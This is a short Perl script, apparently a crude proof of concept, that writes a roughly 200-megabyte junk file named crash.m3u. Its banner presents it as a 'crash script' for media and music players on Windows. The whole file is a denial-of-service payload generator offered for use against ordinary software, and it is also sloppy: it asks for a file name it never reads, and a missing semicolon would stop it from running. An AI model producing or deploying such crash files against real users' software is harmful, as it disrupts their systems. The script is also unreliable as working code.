print "hello this script give you a low level crash script \n  for example script with format .m3u create a crash script in media and music in windows and \n can use in windows alarm and game over  \n";
print "enter file name with format sample crash.m3u ,crash.txt and more \n"
my $file="crash.m3u";
my $junk='\x41' x 200000000;
open($FILE,">$file");
print $FILE "$junk";

close($FILE);

print"junk file with name::>/$file/...created";
